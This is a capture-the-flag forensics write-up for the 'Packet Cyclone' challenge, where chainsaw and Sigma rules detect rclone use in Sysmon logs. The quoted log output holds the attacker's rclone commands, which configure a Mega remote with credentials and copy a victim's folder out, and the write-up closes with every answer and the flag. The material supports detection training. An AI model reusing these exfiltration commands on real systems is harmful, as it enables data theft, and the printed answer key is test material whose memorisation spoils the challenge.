# This is the Write Up for Forensics challenge of Cyber Apocalypse 2K23 CTF - Packet.

> Pratyush Prakhar (5#1NC#4N) - 03/20/2022

## Description

1. On `nc` to the particular endpoint, greeted with a prompt talking about finding `rclone usage` in `Sysmon logs.`

2. Downloaded files give us bunch of [Windows Logs](HTB CTF/CYBER_APOCALYPSE/2K23/Forensics/Packet Cyclone/Logs) and [Sigma Rules](HTB CTF/CYBER_APOCALYPSE/2K23/Forensics/Packet Cyclone/sigma_rules). We will have to look through them for our information.

3. The nc prompt also wants us to look into a tool called [chainsaw](https://github.com/WithSecureLabs/chainsaw) which could help us with it.

## Solution

1. Downloaded the `chainsaw` tool locally.

2. Analyze our `Windows Event Logs` and `Windows Registry` files for certain sigma rules which we obtained.

```bash
┌─[✗]─[ace@parrot]─[~/Desktop/Git_work/CTF/HTB/CYBER_APOCALYPSE/2K23/Forensics/Packet Cyclone]
└──╼ $/opt/chainsaw_t/chainsaw_x86_64-unknown-linux-mus hunt Logs/ -s sigma_rules/ --mapping /opt/chainsaw_t/mappings/sigma-event-logs-all.yml 

 ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗███████╗ █████╗ ██╗    ██╗
██╔════╝██║  ██║██╔══██╗██║████╗  ██║██╔════╝██╔══██╗██║    ██║
██║     ███████║███████║██║██╔██╗ ██║███████╗███████║██║ █╗ ██║
██║     ██╔══██║██╔══██║██║██║╚██╗██║╚════██║██╔══██║██║███╗██║
╚██████╗██║  ██║██║  ██║██║██║ ╚████║███████║██║  ██║╚███╔███╔╝
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚══╝╚══╝
    By Countercept (@FranticTyping, @AlexKornitzer)

[+] Loading detection rules from: sigma_rules/
[+] Loaded 2 detection rules
[+] Loading forensic artefacts from: Logs/ (extensions: .evtx, .evt)
[+] Loaded 149 forensic artefacts (54.3 MB)
[+] Hunting: [========================================] 149/149                                                                                                                               
[+] Group: Sigma
┌─────────────────────┬────────────────────────────┬───────┬──────────────────────────┬──────────┬───────────┬─────────────────┬────────────────────────────────┐
│      timestamp      │         detections         │ count │  Event.System.Provider   │ Event ID │ Record ID │    Computer     │           Event Data           │
├─────────────────────┼────────────────────────────┼───────┼──────────────────────────┼──────────┼───────────┼─────────────────┼────────────────────────────────┤
│ 2023-02-24 15:35:07 │ ‣ Rclone Execution via     │ 1     │ Microsoft-Windows-Sysmon │ 1        │ 76        │ DESKTOP-UTDHED2 │ CommandLine: '"C:\Users\wade\A │
│                     │ Command Line or PowerShell │       │                          │          │           │                 │ ppData\Local\Temp\rclone-v1.61 │
│                     │                            │       │                          │          │           │                 │ .1-windows-amd64\rclone.exe" c │
│                     │                            │       │                          │          │           │                 │ onfig create remote mega user  │
│                     │                            │       │                          │          │           │                 │ majmeret@protonmail.com pass F │
│                     │                            │       │                          │          │           │                 │ BMeavdiaFZbWzpMqIVhJCGXZ5XXZI1 │
│                     │                            │       │                          │          │           │                 │ qsU3EjhoKQw0rEoQqHyI'          │
│                     │                            │       │                          │          │           │                 │ Company: https://rclone.org    │
│                     │                            │       │                          │          │           │                 │ CurrentDirectory: C:\Users\wad │
│                     │                            │       │                          │          │           │                 │ e\AppData\Local\Temp\rclone-v1 │
│                     │                            │       │                          │          │           │                 │ .61.1-windows-amd64\           │
│                     │                            │       │                          │          │           │                 │ Description: Rsync for cloud s │
│                     │                            │       │                          │          │           │                 │ torage                         │
│                     │                            │       │                          │          │           │                 │ FileVersion: 1.61.1            │
│                     │                            │       │                          │          │           │                 │ Hashes: SHA256=E94901809FF7CC5 │
│                     │                            │       │                          │          │           │                 │ 168C1E857D4AC9CBB339CA1F6E21DC │
│                     │                            │       │                          │          │           │                 │ CE95DFB8E28DF799961            │
│                     │                            │       │                          │          │           │                 │ Image: C:\Users\wade\AppData\L │
│                     │                            │       │                          │          │           │                 │ ocal\Temp\rclone-v1.61.1-windo │
│                     │                            │       │                          │          │           │                 │ ws-amd64\rclone.exe            │
│                     │                            │       │                          │          │           │                 │ IntegrityLevel: Medium         │
│                     │                            │       │                          │          │           │                 │ LogonGuid: 10DA3E43-D892-63F8- │
│                     │                            │       │                          │          │           │                 │ 4B6D-030000000000              │
│                     │                            │       │                          │          │           │                 │ LogonId: '0x36d4b'             │
│                     │                            │       │                          │          │           │                 │ OriginalFileName: rclone.exe   │
│                     │                            │       │                          │          │           │                 │ ParentCommandLine: '"C:\Window │
│                     │                            │       │                          │          │           │                 │ s\System32\WindowsPowerShell\v │
│                     │                            │       │                          │          │           │                 │ 1.0\powershell.exe" '          │
│                     │                            │       │                          │          │           │                 │ ParentImage: C:\Windows\System │
│                     │                            │       │                          │          │           │                 │ 32\WindowsPowerShell\v1.0\powe │
│                     │                            │       │                          │          │           │                 │ rshell.exe                     │
│                     │                            │       │                          │          │           │                 │ ParentProcessGuid: 10DA3E43-D8 │
│                     │                            │       │                          │          │           │                 │ D2-63F8-9B00-000000000900      │
│                     │                            │       │                          │          │           │                 │ ParentProcessId: 5888          │
│                     │                            │       │                          │          │           │                 │ ParentUser: DESKTOP-UTDHED2\wa │
│                     │                            │       │                          │          │           │                 │ de                             │
│                     │                            │       │                          │          │           │                 │ ProcessGuid: 10DA3E43-D92B-63F │
│                     │                            │       │                          │          │           │                 │ 8-B100-000000000900            │
│                     │                            │       │                          │          │           │                 │ ProcessId: 3820                │
│                     │                            │       │                          │          │           │                 │ Product: Rclone                │
│                     │                            │       │                          │          │           │                 │ RuleName: '-'                  │
│                     │                            │       │                          │          │           │                 │ TerminalSessionId: 1           │
│                     │                            │       │                          │          │           │                 │ User: DESKTOP-UTDHED2\wade     │
│                     │                            │       │                          │          │           │                 │ UtcTime: 2023-02-24 15:35:07.3 │
│                     │                            │       │                          │          │           │                 │ 36                             │
├─────────────────────┼────────────────────────────┼───────┼──────────────────────────┼──────────┼───────────┼─────────────────┼────────────────────────────────┤
│ 2023-02-24 15:35:17 │ ‣ Rclone Execution via     │ 1     │ Microsoft-Windows-Sysmon │ 1        │ 78        │ DESKTOP-UTDHED2 │ CommandLine: '"C:\Users\wade\A │
│                     │ Command Line or PowerShell │       │                          │          │           │                 │ ppData\Local\Temp\rclone-v1.61 │
│                     │                            │       │                          │          │           │                 │ .1-windows-amd64\rclone.exe" c │
│                     │                            │       │                          │          │           │                 │ opy C:\Users\Wade\Desktop\Reli │
│                     │                            │       │                          │          │           │                 │ c_location\ remote:exfiltratio │
│                     │                            │       │                          │          │           │                 │ n -v'                          │
│                     │                            │       │                          │          │           │                 │ Company: https://rclone.org    │
│                     │                            │       │                          │          │           │                 │ CurrentDirectory: C:\Users\wad │
│                     │                            │       │                          │          │           │                 │ e\AppData\Local\Temp\rclone-v1 │
│                     │                            │       │                          │          │           │                 │ .61.1-windows-amd64\           │
│                     │                            │       │                          │          │           │                 │ Description: Rsync for cloud s │
│                     │                            │       │                          │          │           │                 │ torage                         │
│                     │                            │       │                          │          │           │                 │ FileVersion: 1.61.1            │
│                     │                            │       │                          │          │           │                 │ Hashes: SHA256=E94901809FF7CC5 │
│                     │                            │       │                          │          │           │                 │ 168C1E857D4AC9CBB339CA1F6E21DC │
│                     │                            │       │                          │          │           │                 │ CE95DFB8E28DF799961            │
│                     │                            │       │                          │          │           │                 │ Image: C:\Users\wade\AppData\L │
│                     │                            │       │                          │          │           │                 │ ocal\Temp\rclone-v1.61.1-windo │
│                     │                            │       │                          │          │           │                 │ ws-amd64\rclone.exe            │
│                     │                            │       │                          │          │           │                 │ IntegrityLevel: Medium         │
│                     │                            │       │                          │          │           │                 │ LogonGuid: 10DA3E43-D892-63F8- │
│                     │                            │       │                          │          │           │                 │ 4B6D-030000000000              │
│                     │                            │       │                          │          │           │                 │ LogonId: '0x36d4b'             │
│                     │                            │       │                          │          │           │                 │ OriginalFileName: rclone.exe   │
│                     │                            │       │                          │          │           │                 │ ParentCommandLine: '"C:\Window │
│                     │                            │       │                          │          │           │                 │ s\System32\WindowsPowerShell\v │
│                     │                            │       │                          │          │           │                 │ 1.0\powershell.exe" '          │
│                     │                            │       │                          │          │           │                 │ ParentImage: C:\Windows\System │
│                     │                            │       │                          │          │           │                 │ 32\WindowsPowerShell\v1.0\powe │
│                     │                            │       │                          │          │           │                 │ rshell.exe                     │
│                     │                            │       │                          │          │           │                 │ ParentProcessGuid: 10DA3E43-D8 │
│                     │                            │       │                          │          │           │                 │ D2-63F8-9B00-000000000900      │
│                     │                            │       │                          │          │           │                 │ ParentProcessId: 5888          │
│                     │                            │       │                          │          │           │                 │ ParentUser: DESKTOP-UTDHED2\wa │
│                     │                            │       │                          │          │           │                 │ de                             │
│                     │                            │       │                          │          │           │                 │ ProcessGuid: 10DA3E43-D935-63F │
│                     │                            │       │                          │          │           │                 │ 8-B200-000000000900            │
│                     │                            │       │                          │          │           │                 │ ProcessId: 5116                │
│                     │                            │       │                          │          │           │                 │ Product: Rclone                │
│                     │                            │       │                          │          │           │                 │ RuleName: '-'                  │
│                     │                            │       │                          │          │           │                 │ TerminalSessionId: 1           │
│                     │                            │       │                          │          │           │                 │ User: DESKTOP-UTDHED2\wade     │
│                     │                            │       │                          │          │           │                 │ UtcTime: 2023-02-24 15:35:17.5 │
│                     │                            │       │                          │          │           │                 │ 16                             │
└─────────────────────┴────────────────────────────┴───────┴──────────────────────────┴──────────┴───────────┴─────────────────┴────────────────────────────────┘
```


3. We can now use the information above to answer the prompt's questions to get our flag.

```bash
$nc 206.189.28.180 30972

+----------------+-------------------------------------------------------------------------------+
|     Title      |                                  Description                                  |
+----------------+-------------------------------------------------------------------------------+
| Packet Cyclone |           Pandora's friend and partner, Wade, is the one that leads           |
|                |                  the investigation into the relic's location.                 |
|                |         Recently, he noticed some weird traffic coming from his host.         |
|                |             That led him to believe that his host was compromised.            |
|                | After a quick investigation, his fear was confirmed. Pandora tries now to see |
|                |  if the attacker caused the suspicious traffic during the exfiltration phase. |
|                |             Pandora believes that the malicious actor used rclone             |
|                |                  to exfiltrate Wade's research to the cloud.                  |
|                |     Using the tool chainsaw and many sigma rules that can be found online,    |
|                |   can you detect the usage of rclone from the event logs produced by Sysmon?  |
|                |                 To get the flag, you need to start and connect                |
|                |         to the docker service and answer all the questions correctly.         |
+----------------+-------------------------------------------------------------------------------+

What is the email of the attacker used for the exfiltration process? (for example: name@email.com)
>  majmeret@protonmail.com
[+] Correct!

What is the password of the attacker used for the exfiltration process? (for example: password123)
> FBMeavdiaFZbWzpMqIVhJCGXZ5XXZI1qsU3EjhoKQw0rEoQqHyI
[+] Correct!

What is the Cloud storage provider used by the attacker? (for example: cloud)
> mega
[+] Correct!

What is the ID of the process used by the attackers to configure their tool? (for example: 1337)
> 3820
[+] Correct!

What is the name of the folder the attacker exfiltrated; provide the full path. (for example: C:\Users\user\folder)
> C:\Users\Wade\Desktop\Relic_location\
[-] Wrong Answer.
What is the name of the folder the attacker exfiltrated; provide the full path. (for example: C:\Users\user\folder)

> C:\Users\Wade\Desktop\Relic_location 
[+] Correct!

What is the name of the folder the attacker exfiltrated the files to? (for example: exfil_folder)
> exfiltration
[+] Correct!

[+] Here is the flag: HTB{Rcl0n3_1s_n0t_s0_inn0c3nt_4ft3r_4ll}
```